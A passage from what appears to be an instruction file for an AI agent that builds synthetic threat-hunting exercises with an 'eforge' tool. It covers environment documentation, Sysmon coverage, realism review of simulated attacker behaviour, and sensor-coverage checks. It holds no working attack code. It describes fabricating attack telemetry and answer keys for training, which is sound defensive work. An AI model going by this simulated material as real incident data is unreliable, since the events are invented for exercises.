### Network Sensors

| Sensor | Type | Placement | Monitors | Direction | Formats |
|--------|------|-----------|----------|-----------|---------|
| ... | ... | SPAN/TAP | [segments] | ... | ... |

[Describe what each sensor can see in plain language.]

## Available Data Sources

| Log Format | Description |
|------------|-------------|
| ... | ... |
```

### Rules for Building ENVIRONMENT.md

**User directory:**
- Sort all listed users alphabetically by username
- Include ALL users who appear in the storyline (their accounts show up in the attack data, so students need to be able to look them up)
- Add 5–15 additional users from the background population, mixed in with the storyline users
- For very large scenarios (50+ users), include a representative subset — not all of them
- **Exclude any accounts the attacker created** during the attack (e.g., persistence accounts like `svc_sqlbackup`) — these wouldn't exist in the org's directory beforehand
- **Include every legitimate user whose account gets compromised** — students will see activity under that username and need to look them up
- Use natural role names, not raw persona codes. Persona "hr" becomes "Human Resources", "sysadmin" becomes "System Administrator", "developer" becomes "Software Engineer", etc.

**Timezone:**
- State the organization's timezone AND explicitly note that all log timestamps are in UTC
- Include the UTC offset so there's no ambiguity (e.g., "Eastern Time (UTC-5)")
- Show business hours converted to UTC

**Network sensors:**
- Describe what each sensor can see in straightforward terms (e.g., "Monitors all traffic between subnets via SPAN port on the core switch")
- Do NOT editorialize about gaps or blind spots — just describe what each sensor covers

**Sysmon configuration (when windows format is included):**
- Document the Sysmon filtering policy under a "Security Tooling" or "Monitoring & Logging" section
- Describe Sysmon as deployed with a community-based config (SwiftOnSecurity/Olaf Hartong style) that includes:
  - Process creation and termination (Events 1, 5)
  - Network connections for LOLBins and suspicious ports — browsers and system services excluded (Event 3)
  - DLL/module loading for unsigned and third-party DLLs — Microsoft-signed System32 DLLs excluded (Event 7)
  - File creation for executable types in suspicious locations — Startup, Downloads, Temp, scheduled tasks (Event 11)
  - Registry persistence and tampering — Run keys, Winlogon, services, firewall/Defender/UAC modifications (Events 12/13)
  - DNS queries from all processes (Event 22)
  - Process injection and credential access detection (Events 8, 10)
- This helps analysts understand why some expected events may be absent (filtered by config) and what telemetry is available

**File location:**
- Save as `scenarios/<slug>/ENVIRONMENT.md`
- Keep `ENVIRONMENT.md` directly under the scenario root, not under `artifacts/`

## Output Workflow

After the interview, generate both files:

1. **Scenario root** — Create/use `scenarios/<slug>/` unless the user explicitly requested a different bundle root
2. **Scenario YAML** — Write to `scenarios/<slug>/scenario.yaml`
3. **ENVIRONMENT.md** — Write to `scenarios/<slug>/ENVIRONMENT.md`
4. **Optional authored artifacts** — If you create exercise collateral such as a phishing email message (`.eml`), write it under `scenarios/<slug>/artifacts/`. Do not put standard files such as `ENVIRONMENT.md`, `GROUND_TRUTH.md`, `OBSERVATION_MANIFEST.json`, or `OUTPUT_TARGET.txt` in `artifacts/`.
5. **Realism Review** — Before validating, review the entire scenario as a tough-but-fair devil's advocate. Check:
   - **Attack realism**: Does the attack chain make sense? Would a real attacker do this in this order? Are there missing steps (e.g., no reconnaissance before lateral movement, no persistence after initial access)?
   - **Technical accuracy**: Are command lines correct for the target OS? Are process paths right? Do the MITRE ATT&CK technique IDs match what's actually happening?
   - **Naming realism**: Are all attacker-controlled artifacts (domains, files, processes, created accounts, scheduled tasks, services, staging archives) plausibly named? Would any name immediately tip off a defender? Check for names like `attacker`, `evil.com`, `malware.exe`, `@external`, or anything that screams "malicious".
   - **Anti-curation check**: Do artifact names collectively reveal the storyline too neatly? Replace names that summarize intent or function, such as C2 domains full of `cdn`/`auth`/`update`, task or service names like `HealthMonitorSvc`, accounts like `svc_sqlreader`, or staging archives named after the exact data being stolen.
   - **Environmental consistency**: Do the users, systems, and network make sense together? Would this org realistically have this infrastructure?
   - **Log boundary**: Are all systems in the systems list owned by the victim org? Are there any third-party servers (SaaS, cloud provider, partner) that shouldn't be generating OS-level logs? External entities should only appear as IP addresses in network connections, never as systems with hostnames and OS-level log generation.
   - **Timing realism**: Are attack events spaced realistically? (Not crammed into 30 seconds, not dragged over days with no activity)
   - **Detection opportunity**: Is there enough signal for a hunter to find the attack while still requiring genuine effort?
   - **Attacker messiness**: Does the storyline include fumbles and dead ends appropriate to the chosen attacker realism level? A storyline with zero mistakes is unrealistic unless the user specifically requested a surgical APT scenario.
   - **Sensor coverage** (see next section): Can the attack actually be discovered given the declared sensor topology and log formats?
   - **Engine-aware realism**:
     - Do NOT specify explicit `mac_address` in `dhcp_lease` events — the engine auto-generates diverse OUI prefixes from `network_params.yaml`
     - DHCP broadcast evidence is link-local. If the scenario expects `dhcp.log`, include a SPAN-style Zeek sensor on the client segment; TAP/firewall sensors on other segments will not see it.
     - Storyline `connection` events to raw C2 IPs will skip DNS emission (realistic for direct-IP beaconing, but means no DNS trail for hunters). If you want DNS evidence, use a domain name as the C2 destination and add it to the scenario narrative
     - Assign role-appropriate `services` to Linux servers (e.g., `mysql` on DB servers, `apache`/`nginx` on web servers) — this drives per-server bash history RBAC (sysadmins on all servers, DBAs only on DB servers, etc.)
     - Ensure each server has a distinct role to avoid identical bash history content across all servers
   If you find issues, fix them. Tell the user what you changed and why.

### Sensor Coverage Verification

Before finalizing the scenario, verify that every storyline event is **discoverable** given the declared topology, log formats, and sensor placement. A storyline event that produces zero log traces is invisible to the hunter and defeats the purpose of the exercise.

**Check each storyline event against these rules:**

1. **Host log coverage** — The system where the event occurs must have at least one matching log format enabled in `output.logs`:
   - Windows systems need `windows` (or `ecar`) for logon/process events
   - Linux systems need `syslog` and/or `bash_history` for authentication and command execution
   - If a system's OS doesn't match any enabled format, the event will produce no host-level traces

2. **Network sensor coverage** — If the storyline event involves a network connection (lateral movement, C2 communication, exfiltration, scanning):
   - At least one network sensor must monitor the segment where the source or destination system resides
   - Check `network.sensors[].monitoring_segments` against the segments containing the storyline systems
   - A TAP sensor does not see same-segment traffic. For multi-segment TAPs, internal cross-segment traffic is visible only when both endpoint segments are monitored; SPAN sensors can mirror traffic where either endpoint is monitored.
   - If no network sensors cover the relevant segments, add one or warn the user about the visibility gap

3. **Format enablement** — Verify the formats listed in each sensor's `log_formats` are also listed in `output.logs`. A sensor configured to generate `snort_alert` won't produce output if `snort_alert` isn't in the output logs list.

**If you find coverage gaps:**
- Flag the specific storyline event(s) that may not be discoverable
- Suggest concrete fixes: add a sensor, enable a log format, or adjust the network topology
- Let the user decide whether to fix the gap or accept it (some scenarios intentionally have blind spots to test whether hunters notice)
6. **Validate** — Run `eforge validate scenarios/<slug>/scenario.yaml` to check schema and cross-references
7. If validation fails, fix the issues and re-validate
8. **Summarize** what was created: scenario root, optional artifacts, environment size, time window, attack narrative overview, log formats

If the user wants to immediately generate logs, suggest using `/eforge generate` or running `eforge generate <scenario-file>`.

When generation completes, the scenario root will contain `GROUND_TRUTH.md` with the full attack timeline, IOCs, and answer key, plus `data/` for logs. Let the user know these exist and where to find them.
